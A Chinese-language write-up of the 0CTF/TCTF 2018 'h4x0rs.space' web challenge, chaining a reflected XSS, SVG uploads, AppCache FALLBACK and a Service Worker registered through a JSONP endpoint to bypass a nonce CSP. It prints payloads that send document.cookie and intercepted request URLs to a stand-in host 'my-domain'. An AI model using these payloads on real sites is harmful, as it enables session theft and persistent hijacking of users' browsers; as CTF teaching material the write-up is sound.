---
title: TCTF/0CTF2018 h4x0rs.space Writeup
date: 2018-04-17 21:44:46
tags:
- xss
- CSP
---

TCTF/0CTF中的压轴题目，本来可以在题目还在的时候研究的，无奈又因为强网杯的事情又拖了好几天，今天才整理出来，整个题目的利用思路都是近几年才被人们提出来的，这次比赛我也是第一次遇到环境，其中关于Appcache以及Service Worker的利用方式非常有趣，能在特殊环境下起到意想不到的作用。


下面的Writeup主要来自于

[https://gist.github.com/masatokinugawa/b55a890c4b051cc6575b010e8c835803](https://gist.github.com/masatokinugawa/b55a890c4b051cc6575b010e8c835803)


<!--more-->

# h4x0rs.space #

## 题目分析 ##

```
I've made a blog platform let you write your secret. 
Nobody can know it since I enabled all of modern web security mechanism, is it cool, huh?

Get document. cookie of the admin.

h4x0rs.space

Hint: Every bug you found has a reason, and you may want to check some uncommon HTML5 features Also notice that, the admin is using real browser, since I found out Headless is not much real-world. GL

Hint 2: W3C defines everything, but sometimes browser developers decided to implement in their way, get the same browser to admin and test everything on it.

Hint 3: Can you make "500 Internal Server Error" from a post /blog.php/{id} ? Make it fall, the good will come. And btw, you can solve without any automatic tool. Connect all the dots.

Last Hint: CACHE
```

先简单说一下整个题目逻辑

1、站内是一个生成文章的网站，可以输入title，content，然后可以上传图片，值得注意的是，这里的所有输入都会被转义，生成的文章内容不存在xss点。

2、站内开启CSP，而且是比较严格的nonce CSP

```
Content-Security-Policy:
default-src none; frame-src https://h4x0rs.space/blog/untrusted_files/embed/embed.php https://www.google.com/recaptcha/; script-src 'nonce-05c13d07976dba84c4f29f4fd4921830'; style-src 'self' 'unsafe-inline' fonts.googleapis.com; font-src fonts.gstatic.com; img-src *; connect-src https://h4x0rs.space/blog/report.php;
```

3、文章内引入了类似短标签的方式可以插入部分标签，例如`[img]test[/img]`。

值得注意的是这里有一个特例
```
case 'instagram':
	var dummy = document.createElement('div');
	dummy.innerHTML = `<iframe width="0" height="0" src="" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>`; // dummy object since f.frameborder=0 doesn't work.
	var f = dummy.firstElementChild;
	var base = 'https://h4x0rs.space/blog/untrusted_files/embed/embed.php';
	if(e['name'] == 'youtube'){
		f.width = 500;
		f.height = 330;
		f.src = base+'?embed='+found[1]+'&p=youtube';
	} else if(e['name'] == 'instagram') {
		f.width = 350;
		f.height = 420;
		f.src = base+'?embed='+found[1]+'&p=instagram';
	}
	var d_iframe = document.createElement('div');
	d_iframe.id = 'embed'+iframes_delayed.length; // loading iframe at same time may cause overload. delay it.
	iframes_delayed.push( document.createElement('div').appendChild(f).parentElement.innerHTML /* hotfix: to get iframe html  */ );
	o.innerHTML = o.innerHTML.replace( found[0], d_iframe.outerHTML );
	break;
```

如果插入`[ig]123[/ig]`就会被转为引入`https://h4x0rs.space/blog/untrusted_files/embed/embed.php?embed=123&p=instagram`的iframe。

值得注意的是，embed.php中的embed这里存在反射性xss点，只要闭合注释就可以插入标签，遗憾的是这里仍然会被CSP限制。

```
https://h4x0rs.space/blog/untrusted_files/embed/embed.php?embed=--><script>alert()</script>&p=instagram
```

4、站内有一个jsonp的接口，但不能传尖括号，后面的文章内容什么的也没办法逃逸双引号。

```
https://h4x0rs.space/blog/pad.php?callback=render&id=c3c08256fa7df63ec4e9a81efa9c3db95e51147dd14733abc4145011cdf2bf9d
```

5、图片上传的接口可以上传SVG，图片在站内同源，并且不受到CSP的限制，我们可以在SVG中执行js代码，来绕过CSP，而重点就是，我们只能提交blog id，我们需要找到一个办法来让它执行。


## AppCache 的利用

在提示中，我们很明显可以看到`cache`这个提示，这里的提示其实是说，利用appcache来加载svg的方式。

在这之前，我们可能需要了解一下什么是Appcache。具体可以看这篇文章。

[https://www.html5rocks.com/en/tutorials/appcache/beginner/](https://www.html5rocks.com/en/tutorials/appcache/beginner/)

这是一种在数年前随H5诞生的一种可以让开发人员指定浏览器缓存哪些文件以供离线访问，在缓存情况下，即使用户在离线状态刷新页面也同样不会影响访问。

Appcache的开启方法是在html标签下添加manifest属性
```
<html manifest="example.appcache">
  ...
</html>
```

这里的`example.appcache`可以是相对路径也可以是绝对路径，清单文件的结构大致如下：
```
CACHE MANIFEST
# 2010-06-18:v2

# Explicitly cached 'master entries'.
CACHE:
/favicon.ico
index.html
stylesheet.css
images/logo.png
scripts/main.js

# Resources that require the user to be online.
NETWORK:
login.php
/myapi
http://api.twitter.com

# static.html will be served if main.py is inaccessible
# offline.jpg will be served in place of all images in images/large/
# offline.html will be served in place of all other .html files
FALLBACK:
/main.py /static.html
images/large/ images/offline.jpg
*.html /offline.html
```

CACHE：
这是条目的默认部分。系统会在首次下载此标头下列出的文件（或紧跟在 CACHE MANIFEST 后的文件）后显式缓存这些文件。

NETWORK：
此部分下列出的文件是需要连接到服务器的白名单资源。无论用户是否处于离线状态，对这些资源的所有请求都会绕过缓存。可使用通配符。

FALLBACK：
此部分是可选的，用于指定无法访问资源时的后备网页。其中第一个 URI 代表资源，第二个代表后备网页。两个 URI 必须相关，并且必须与清单文件同源。可使用通配符。

这里有一点儿很重要，关于Appcache，**您必须修改清单文件本身才能让浏览器刷新缓存文件**。

去年@filedescriptor公开了一个利用Appache来攻击沙箱域的方法。

[https://speakerdeck.com/filedescriptor/exploiting-the-unexploitable-with-lesser-known-browser-tricks?slide=16](https://speakerdeck.com/filedescriptor/exploiting-the-unexploitable-with-lesser-known-browser-tricks?slide=16)

这里正是使用了Appcache的FALLBACK文件，我们可以通过上传恶意的svg文件，形似
```
<svg xmlns="http://www.w3.org/2000/svg">
<script>fetch(`https://my-domain/?${document.cookie}`)</script>
</svg>
```

然后将manifest设置为相对目录的svg文件路径，形似
```
 <!-- DEBUG 
embed_id: --><html manifest=/blog/untrusted_files/[SVG_MANIFEST].svg>
-->
...

```

在这种情况下，如果我们能触发页面500，那么页面就会跳转至FALLBACK指定页面，我们成功引入了一个任意文件跳转。

紧接着，我们需要通过引入`[ig]a#[/ig]`，通过拼接url的方式，这里的`#`会使后面的`&instagram`无效，使页面返回500错误，缓存就会将其引向FALLBACK设置页面。

这里的payload形似

```
[yt]--%3E%3Chtml%20manifest=%2Fblog%2Funtrusted_files%2F[SVG_MANIFEST].svg%3E[/yt]

[yt]a#[/yt]
[yt]a#[/yt]
[yt]a#[/yt]
[yt]a#[/yt]
[yt]a#[/yt]
[yt]a#[/yt]
[yt]a#[/yt]
[yt]a#[/yt]
[yt]a#[/yt]
[yt]a#[/yt]
```

这里之所以会引入多个`a#`是因为缓存中FALLBACK的加载时间可能慢于单个iframe的加载时间，所以需要引入多个，保证FALLBACK的生效。

最后发送文章id到后台，浏览器访问文章则会触发下面的流程。

上面的文章会转化为

```
<iframe width="0" height="0" src="https://h4x0rs.space/blog/untrusted_files/embed/embed.php?embed=--%3E%3Chtml%20manifest=%2Fblog%2Funtrusted_files%2F[SVG_MANIFEST].svg%3E&p=youtube" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>


<iframe width="0" height="0" src="https://h4x0rs.space/blog/untrusted_files/embed/embed.php?embed=a#&p=youtube" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>

...
```

上面的iframe标签会引入我们提前上传好的manfiest文件

```
CACHE MANIFEST

FALLBACK:
/blog/untrusted_files/embed/embed.php?embed=a /blog/untrusted_files/[SVG_HAVING_XSS_PAYLOAD].svg
```

，并将FALLBACK设置为`/blog/untrusted_files/[SVG_HAVING_XSS_PAYLOAD].svg`

然后下面的iframe标签会访问`/blog/untrusted_files/embed/embed.php?embed=a`并处罚500错误，跳转为提前设置好的svg页面，成功逃逸CSP。

当我们第一次读取到document.cookie时，返回为

```
OK! You got me... This is your reward: "flag{m0ar_featureS_" Wait, I wonder if you could hack my server. Okay, shall we play a game? I am going to check my secret blog post where you can find the rest of flag in next 5 seconds. If you know where I hide it, you win! Good luck. For briefly, I will open a new tab in my browser then go to my https://h4x0rs.space/blog.php/*secret_id* . You have to find where is it. 1...2...3...4..5... (Contact me @l4wio on IRC if you have a question)

```

大致意思是说，bot会在5秒后访问flag页面，我们需要获取这个id。

## Service Worker的利用

仔细回顾站内的功能，根据出题人的意思，这里会跳转到形似`https://h4x0rs.space/blog/[blog_post_id]`的url，通过Appcache我们只能控制`/blog/untrusted_files/`这个目录下的缓存，这里我们需要控制到另一个选项卡的状态。

在不具有窗口引用办法的情况下，这里只有使用Service Worker来做持久化利用。

关于Service Worker忽然发现以前很多人提到过，但好像一直都没有被重视过。这种一种用来替代Appcache的离线缓存机制，他是基于Web Worker的事件驱动的，他的执行机制都是通过新启动线程解决，比起Appcache来说，它可以针对同域下的整站生效，而且持续保存至浏览器重启都可以重用。

下面是两篇关于service worker的文档：

[https://developers.google.com/web/fundamentals/primers/service-workers/?hl=zh-cn](https://developers.google.com/web/fundamentals/primers/service-workers/?hl=zh-cn)

[https://www.w3.org/TR/service-workers/](https://www.w3.org/TR/service-workers/)

使用Service Worker有两个条件：

1、Service Worker只生效于`https://`或者`http://localhost/`下
2、其次你需要浏览器支持，现在并不是所有的浏览器都支持Service Worker。

当我们满足上述条件，并且有一个xss利用点时，我们可以尝试构造一个持久化xss利用点，但在利用之前，我们需要更多条件。

1、如果我们使用`navigator.serviceWorker.register`来注册js，那么这里请求的url必须同源而且请求文件返回头必须为`text/javascript, application/x-javascript, application/javascript`中的一种。

2、假设站内使用onfetch接口获取内容，我们可以通过hookfetch接口，控制返回来触发持久化控制。

对于第一种情况来说，或许我们很难找到上传js的接口，但不幸的是，jsonp接口刚好符合这样的所有条件~~

具体的利用方式我会额外在写文分析这个，详情可以看这几篇文章:

[http://drops.xmd5.com/static/drops/web-10798.html](http://drops.xmd5.com/static/drops/web-10798.html)

[https://paper.seebug.org/177/](https://paper.seebug.org/177/)

[https://speakerdeck.com/masatokinugawa/pwa-study-sw](https://speakerdeck.com/masatokinugawa/pwa-study-sw)

最后的这个ppt最详细，但他是日语的，读起来非常吃力。

这里回到题目，我们可以注意到站内刚好有一个jsonp接口

```
https://h4x0rs.space/blog/pad.php?callback=render&id=c3c08256fa7df63ec4e9a81efa9c3db95e51147dd14733abc4145011cdf2bf9d
```

值得注意的是，这里的callback接口有字数限制，这里可以通过和title的配合，通过注释来引入任何我们想要的字符串。

```
/*({"data":"QQ==","id":"[BLOG_POST_ID_SW]","title":"*/onfetch=e=>{fetch(`https://my-domain/?${e.request.url}`)}//","time":"2018-04-03 12:32:00","image_type":""});
```

这里需要注意的是，在serviceWorker线程中，我们并不能获取所有的对象，所以这里直接获取当前请求的url。

完整的利用链如下：

1、将`*/onfetch=e=>{fetch(`https://my-domain/?${e.request.url}`)}//`写入文章内，并保留下文章id。

2、构造jsonp接口`https://h4x0rs.space/blog/pad.php?callback=/*&id={sw_post_id}`

```
/*({"data":"QQ==","id":"[BLOG_POST_ID_SW]","title":"*/onfetch=e=>{fetch(`https://my-domain/?${e.request.url}`)}//","time":"2018-04-03 12:32:00","image_type":""});
```

3、上传svg,`https://h4x0rs.space/blog/untrusted_files/[SVG_HAVING_SW].svg`

```
<svg xmlns="http://www.w3.org/2000/svg">
<script>navigator.serviceWorker.register('/blog/pad.php?callback=/*&amp;id={sw_post_id}')</script>
</svg>
```

4、构造manifest文件,`https://h4x0rs.space/blog/untrusted_files/[SVG_MANIFEST_SW].svg`

```
CACHE MANIFEST

FALLBACK:
/blog/untrusted_files/embed/embed.php?embed=a /blog/untrusted_files/[SVG_HAVING_SW].svg
```

5、构造embed页面url

```
https://h4x0rs.space/blog/untrusted_files/embed/embed.php?embed=--%3E%3Chtml%20manifest=/blog/untrusted_files/[SVG_MANIFEST_SW].svg%3E&p=youtube
```

6、最后构造利用文章内容

```
[yt]--%3E%3Chtml%20manifest=%2Fblog%2Funtrusted_files%2F[SVG_MANIFEST_SW].svg%3E[/yt]

[yt]a#[/yt]
[yt]a#[/yt]
[yt]a#[/yt]
[yt]a#[/yt]
[yt]a#[/yt]
[yt]a#[/yt]
[yt]a#[/yt]
[yt]a#[/yt]
[yt]a#[/yt]
[yt]a#[/yt]
```

7、发送post id即可

## ref

- [https://gist.github.com/masatokinugawa/b55a890c4b051cc6575b010e8c835803](https://gist.github.com/masatokinugawa/b55a890c4b051cc6575b010e8c835803)

- [https://github.com/l4wio/CTF-challenges-by-me/tree/master/0ctf_quals-2018/h4x0rs.space](https://github.com/l4wio/CTF-challenges-by-me/tree/master/0ctf_quals-2018/h4x0rs.space)

- [https://speakerdeck.com/filedescriptor/exploiting-the-unexploitable-with-lesser-known-browser-tricks?slide=16](https://speakerdeck.com/filedescriptor/exploiting-the-unexploitable-with-lesser-known-browser-tricks?slide=16)

- [https://github.com/l4wio/CTF-challenges-by-me/blob/master/0ctf_quals-2018/h4x0rs.space/solve.py](https://github.com/l4wio/CTF-challenges-by-me/blob/master/0ctf_quals-2018/h4x0rs.space/solve.py)

- [https://speakerdeck.com/masatokinugawa/pwa-study-sw](https://speakerdeck.com/masatokinugawa/pwa-study-sw)

- [http://drops.xmd5.com/static/drops/web-10798.html](http://drops.xmd5.com/static/drops/web-10798.html)

- [https://paper.seebug.org/177/](https://paper.seebug.org/177/)
